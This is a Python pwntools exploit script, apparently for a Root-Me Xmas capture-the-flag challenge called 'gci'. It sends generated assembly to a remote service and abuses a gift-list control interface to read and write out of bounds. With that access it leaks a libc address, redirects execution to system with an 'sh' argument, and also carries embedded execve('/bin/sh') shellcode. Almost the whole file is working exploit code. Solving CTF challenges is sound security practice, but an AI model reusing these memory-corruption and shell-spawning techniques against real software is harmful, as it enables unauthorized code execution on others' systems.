#!/usr/bin/env python3

from pwn import *

exe = ELF("gci_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.terminal = ["tmux", "splitw", "-h", "-l", "110"]
context.delete_corefiles = True
context.rename_corefiles = False
host = 'dyn-01.xmas.root-me.org'
port = 33492

gdbscript = '''
init-pwndbg
brva 0x1732
break gci_read
continue
'''.format(**locals())

GCI_START = 0xcafe0000

GCI_CTRL_GIFT = 0x00
GCI_CTRL_GIFT_MAX = 0x08
GCI_CTRL_GIFT_IDX = 0x10
GCI_CTRL_CMD = 0x18

GCI_CMD_INIT = 0x1337
GCI_CMD_ADD_GIFT = 0x1338
GCI_CMD_GET_GIFT = 0x1339
GCI_CMD_EDIT_GIFT = 0x1340
GCI_CMD_SUBMIT = 0x1341

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)


def main():
    io = start()

    def init_gift_list():
        payload = 'mov rdi, %d ;\n' % (GCI_START + GCI_CTRL_CMD)
        payload += 'mov rdx, %d ;\n' % GCI_CMD_INIT
        payload += 'mov qword ptr [rdi], rdx ;\n'
        return payload

    def add_gift():
        payload = 'mov rdi, %d ;\n' % (GCI_START + GCI_CTRL_CMD)
        payload += 'mov rdx, %d ;\n' % GCI_CMD_ADD_GIFT
        payload += 'mov qword ptr [rdi], rdx ;\n'
        return payload
    
    def get_gift():
        payload = 'mov rdi, %d ;\n' % (GCI_START + GCI_CTRL_CMD)
        payload += 'mov rdx, %d ;\n' % GCI_CMD_GET_GIFT
        payload += 'mov qword ptr [rdi], rdx ;\n'
        return payload
    
    def edit_gift():
        payload = 'mov rdi, %d ;\n' % (GCI_START + GCI_CTRL_CMD)
        payload += 'mov rdx, %d ;\n' % GCI_CMD_EDIT_GIFT
        payload += 'mov qword ptr [rdi], rdx ;\n'
        return payload
    
    def submit():
        payload = 'mov rdi, %d ;\n' % (GCI_START + GCI_CTRL_CMD)
        payload += 'mov rdx, %d ;\n' % GCI_CMD_SUBMIT
        payload += 'mov qword ptr [rdi], rdx ;\n'
        return payload
    
    def set_gift_to_add(gift):
        payload = 'mov rdi, %d ;\n' % (GCI_START + GCI_CTRL_GIFT)
        payload += 'mov rdx, %d ;\n' % gift
        payload += 'mov qword ptr [rdi], rdx ;\n'
        return payload
    
    def set_gift_max(gift_max):
        payload = 'mov rdi, %d ;\n' % (GCI_START + GCI_CTRL_GIFT_MAX)
        payload += 'mov rdx, %d ;\n' % gift_max
        payload += 'mov qword ptr [rdi], rdx ;\n'
        return payload
    
    def set_gift_idx(gift_idx):
        payload = 'mov rdi, %d ;\n' % (GCI_START + GCI_CTRL_GIFT_IDX)
        payload += 'mov rdx, %d ;\n' % gift_idx
        payload += 'mov qword ptr [rdi], rdx ;\n'
        return payload
    
    def get_gift_to_get():
        payload = 'mov rdi, %d ;\n' % (GCI_START + GCI_CTRL_GIFT)
        payload += 'mov rax, qword ptr [rdi] ;\n'
        return payload
    
    def get_gift_max():
        payload = 'mov rdi, %d ;\n' % (GCI_START + GCI_CTRL_GIFT_MAX)
        payload += 'mov rax, qword ptr [rdi] ;\n'
        return payload
    
    def get_gift_idx():
        payload = 'mov rdi, %d ;\n' % (GCI_START + GCI_CTRL_GIFT_IDX)
        payload += 'mov rax, qword ptr [rdi] ;\n'
        return payload

    def get4(i):
        payload = set_gift_idx(i)
        payload += get_gift()
        payload += get_gift_to_get()
        return payload

    def get8(i):
        payload = get4(i)
        payload += 'mov rbx, rax ;\n'
        payload += get4(i+1)
        payload += 'shl rax, 32 ;\n'
        payload += 'add rax, rbx ;\n'
        return payload

    def set4(i, val):
        payload = set_gift_idx(i)
        payload += set_gift_to_add(val)
        payload += edit_gift()
        return payload

    def set8(i, val):
        payload = set4(i, val & ((1<<32) - 1))
        payload += set4(i+1, val >> 32)
        return payload
    
    def set_gift_idx_rax():
        payload = 'mov rdi, %d ;\n' % (GCI_START + GCI_CTRL_GIFT_IDX)
        payload += 'mov rdx, rax ;\n'
        payload += 'mov qword ptr [rdi], rdx ;\n'
        return payload

    def set4_val_rax(i):
        payload = set_gift_idx(i)
        payload += 'mov rdi, %d ;\n' % (GCI_START + GCI_CTRL_GIFT)
        payload += 'mov rdx, rax ;\n'
        payload += 'mov qword ptr [rdi], rdx ;\n'
        payload += edit_gift()        
        return payload

    def set8_val_rax(i):
        payload = 'mov rbx, rax ;\n'
        payload += 'shl rax, 32 ;\n'
        payload += 'shr rax, 32 ;\n'
        payload += set4_val_rax(i)
        payload += 'mov rax, rbx ;\n'
        payload += 'shr rax, 32 ;\n'
        payload += set4_val_rax(i+1)
        return payload

    def set4_offset_rax(val):
        payload = set_gift_idx_rax()
        payload += set_gift_to_add(val)
        payload += edit_gift()        
        return payload

    def copy_offset_rax(bstr):
        payload = ''
        for i in range(0,len(bstr),4):
            payload += set4_offset_rax(u32(bstr[i:i+4]))
            payload += 'inc rax; \n'
        return payload
    
    # good luck pwning :)

    sc = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05\x00'
    0x6873
    code = set_gift_max(136)
    code += init_gift_list()
    code += set_gift_max((1<<64) - 1)
    code += set_gift_to_add(0xcafebabe)
    code += add_gift()
    code += set4(140, 0x6873) # sh
    code += get8(97504) # libc
    code += get8(97504) # libc
    # code += 'sub rax, 0x203b20 ;\n' # libc base
    # code += 'sub rax, 0x40100000 ;\n' # rwx segment
    # code += 'mov rbx, rax ;\n'
    # code += get8(12) # heap
    # code += 'sub rax, 0x420 ;\n' # heap base
    # code += 'sub rbx, rax ;\n'
    # code += 'shr rbx, 4 ;\n'
    # code += 'mov rax, rbx; \n' # offset
    # code += copy_offset_rax(sc)
    # code += get8(92336) # libc    
    code += 'sub rax, 0x1ab3e0 ;\n' # system
    # code += 'sub rax, 0x40100000 ;\n' # rwx segment    
    code += set8_val_rax(5228)
    code += get_gift_max()
    # print(code)

    code = asm(code)
    
    io.sendlineafter(b'Code length (16384 max): ', str(len(code)).encode())
    io.sendafter(b'Enter your code: ', code)
    
    io.interactive()


if __name__ == "__main__":
    main()
